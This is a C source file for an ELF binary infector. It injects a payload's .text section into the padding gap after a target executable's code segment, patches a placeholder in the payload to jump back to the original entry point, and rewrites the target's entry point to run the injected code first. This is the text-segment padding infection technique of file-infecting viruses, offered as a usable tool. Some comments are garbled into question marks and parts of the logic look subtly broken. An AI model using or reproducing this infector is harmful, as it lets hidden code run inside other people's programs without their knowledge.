#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>
#include <elf.h>
#include <sys/mman.h>

int get_file_size(int fd);
int elf_open_map(char *filename, void **data, int *size);
Elf64_Phdr* find_injectible_loc(void *d,int fsize,int *p,int *len);
Elf64_Shdr *find_section(void *data, char *name);
int patch_entry_point(void *m,int len,long pat,long val);

int main(int argc, char *argv[])
{
	void *d,*d1;
	int target_fd, payload_fd;
	int size,size1,p,len;
	Elf64_Addr ep;
	Elf64_Ehdr *elf_hdr;
	if(argc<3)
	{
		printf("Usage: <%s> <payload>\n",argv[0]);
		exit(EXIT_FAILURE);
	}
	target_fd=elf_open_map(argv[1],&d,&size);
	payload_fd=elf_open_map(argv[2],&d1,&size1);
	elf_hdr=(Elf64_Ehdr *)d;
	ep=elf_hdr->e_entry;
	printf("Target entry point is %p\n",(void *)ep);
	Elf64_Phdr *t_text_segment=find_injectible_loc(d,size,&p, &len);//??????????????
	Elf64_Addr base=t_text_segment->p_vaddr;//?????????????
	Elf64_Shdr *p_text_sec=find_section(d1,".text");
	printf("Payload .text section found at %1x (%1x bytes)\n",p_text_sec->sh_offset,p_text_sec->sh_size);
	if(p_text_sec->sh_size>len)//???????????????
	{
		printf("Payload is too big, injection failed\n");
		exit(EXIT_FAILURE);
	}
	memmove(d+p,d1+p_text_sec->sh_offset,p_text_sec->sh_size);//??????????????	
	patch_entry_point(d+p,p_text_sec->sh_size,0x11111111,(long)ep);
	elf_hdr->e_entry=(Elf64_Addr)(base+p);
	close(target_fd);
	close(payload_fd);
}

int get_file_size(int fd)
{
	struct stat statbuf; //so apparently, using *statbuf will cause some data to override return address and segfault the program
	if(fstat(fd,&statbuf)<0)
	{
		perror("fstat:");
		exit(EXIT_FAILURE);
	}
	return statbuf.st_size;
}

int elf_open_map(char *filename, void **data, int *len)
{
	int sz,fd;
	if((fd=open(filename,O_RDWR|O_APPEND,0))<0)
	{
		perror("error opening file:");
		exit(EXIT_FAILURE);
	}
	sz=get_file_size(fd);
	if((*data=mmap(0,sz,PROT_READ|PROT_WRITE|PROT_EXEC,MAP_SHARED,fd,0))==MAP_FAILED)
	{
		perror("mmap");
		exit(EXIT_FAILURE);
	}
	printf("mapped %d bytes at %p\n",sz,data);
	*len=sz;
	return fd;	
}

Elf64_Phdr* find_injectible_loc(void *d,int fsize,int *p,int *len)
{
	Elf64_Ehdr *elf_hdr=(Elf64_Ehdr *) d;//executable header;
	Elf64_Phdr *elf_segment, *text_segment;
	int num_seg=elf_hdr->e_phnum;//number of segments
	int end_offset, gap=fsize;
	elf_segment=(Elf64_Phdr *)((unsigned char *) elf_hdr+(unsigned int) elf_hdr->e_phoff);
	printf("Num seg is %d\n",num_seg);
	for(int i=0;i<num_seg;i++)
	{
		if(elf_segment->p_type==PT_LOAD && elf_segment->p_flags & 0x11)
		{
			printf("Found .text segment %d\n",i);
			text_segment=elf_segment;
			end_offset=elf_segment->p_offset+elf_segment->p_filesz;
		}
		else
		{
			if(elf_segment->p_type==PT_LOAD && (elf_segment->p_offset-end_offset)<gap)
			{
				printf("Found .LOAD segment %d next to .text segment at offset %d\n",i,(unsigned int)elf_segment->p_offset);
				gap=elf_segment->p_offset-end_offset;
			}
		}
			elf_segment=(Elf64_Phdr *) ((unsigned char *) elf_segment+(unsigned int) elf_hdr->e_phentsize);
	}
		*p=end_offset;
		*len=gap;
		printf(".text segment gap at offset 0x%x(0x%x bytes available)\n",end_offset,gap);
		return text_segment;
}

Elf64_Shdr *find_section(void *data, char *name)
{
	char *section_name;
	Elf64_Ehdr *elf_hdr=(Elf64_Ehdr *)data;
	Elf64_Shdr *shdr=(Elf64_Shdr *)(data+elf_hdr->e_shoff);
	Elf64_Shdr *sh_strtab=&shdr[elf_hdr->e_shstrndx];
	const char *const sh_strtab_p=data+sh_strtab->sh_offset; ///???????????????
	printf("There are %d sections in file, looking for section %s\n",elf_hdr->e_shnum,name);
	for(int i=0;i<elf_hdr->e_shnum;i++)
	{
		section_name=(char *)(sh_strtab_p+shdr[i].sh_name);
		if(!strcmp(section_name,name))
			return &shdr[i];
	}
	return NULL;
}

int patch_entry_point(void *m,int len,long pat,long val)
{
	unsigned char *p=(unsigned char *)m;
	long v;
	int r;
	for(int i=0;i<len;i++)
	{
		v=*((long *)(p+i));
		r=v^pat;
		if(!r)
		{
			printf("Pattern %1x found at offset %d -> %1x\n", pat,i,val);
			*((long *)(p+i))=val;
			return 0;
		}
	}
	return -1;
}